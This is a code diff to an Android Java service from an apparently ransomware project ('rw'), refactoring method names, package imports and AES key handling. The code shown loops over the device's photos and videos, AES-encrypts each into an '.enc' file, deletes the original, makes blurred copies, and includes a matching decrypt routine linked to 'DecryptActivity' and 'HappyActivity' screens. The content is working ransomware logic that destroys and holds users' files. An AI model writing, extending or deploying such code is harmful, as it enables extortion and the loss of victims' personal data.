@@ -26,13 +26,12 @@ import java.util.Date;
 import java.util.List;
 import java.util.Random;
 
-import alepacheco.com.rw.activityes.DecryptActivity;
+import alepacheco.com.rw.activities.DecryptActivity;
 import alepacheco.com.rw.R;
-import alepacheco.com.rw.activityes.HappyActivity;
+import alepacheco.com.rw.activities.HappyActivity;
 import alepacheco.com.rw.apl.Aes;
 import alepacheco.com.rw.apl.BlurBuilder;
 import alepacheco.com.rw.apl.Helper;
-import alepacheco.com.rw.io.IO;
 import alepacheco.com.rw.persistence.LocalStorage;
 
 public class MyService extends Service {
@@ -147,7 +146,7 @@ public class MyService extends Service {
         System.out.println(String.valueOf(progress) + "/" + totalFiles);
     }
 
-    public void encryptFile() throws Exception {
+    public void encryptFiles() throws Exception {
         Helper.makeToast(ctx,"Pics");
         for (File file : al) {
             if (file.getPath().contains(".thumbnails")) {
@@ -160,7 +159,7 @@ public class MyService extends Service {
                     saveFile(brld, file.getParentFile().getPath() + File.separator + "brld_" + file.getName());
                 }
                 Log.v("Crypt file", file.getPath());
-                byte[] enc = Aes.encrypt(KEY, fullyReadFileToBytes(file));
+                byte[] enc = Aes.encrypt(KEY.toString(), fullyReadFileToBytes(file));
                 saveFile(enc, file.getPath() + ".enc");
 
                 file.delete();
@@ -170,7 +169,7 @@ public class MyService extends Service {
         Helper.makeToast(ctx,"Vids");
         for (File vid : vids) {
             if (!vid.getPath().contains(".enc")){
-                Aes.encryptLarge(KEY, vid, new File(vid.getPath()+".enc"));
+                Aes.encryptLarge(KEY.toString(), vid, new File(vid.getPath()+".enc"));
             }
         }
 
@@ -193,7 +192,7 @@ public class MyService extends Service {
             } else if (file.getPath().contains(".enc") && !file.getPath().contains(".enc.enc") && !file.getPath().contains("brld")) {
                 //Decrypt
                 byte[] in = fullyReadFileToBytes(file);
-                byte[] dec = Aes.decrypt(KEY, in);
+                byte[] dec = Aes.decrypt(KEY.toString(), in);
                 saveFile(dec, file.getPath().substring(0, file.getPath().length() - 4));
                 file.delete();
             }
@@ -202,7 +201,7 @@ public class MyService extends Service {
 
         for (File vid : vids) {
             if (vid.getPath().contains(".enc") && !vid.getPath().contains(".enc.enc")) {
-                Aes.decryptLarge(KEY, vid, new File(vid.getPath().substring(0, vid.getPath().length() - 4)));
+                Aes.decryptLarge(KEY.toString(), vid, new File(vid.getPath().substring(0, vid.getPath().length() - 4)));
             }
         }
 
@@ -272,6 +271,7 @@ public class MyService extends Service {
         }
         return inFiles;
     }
+
 
     public byte[] blurPhoto(File file) {
         BitmapFactory.Options options = new BitmapFactory.Options();
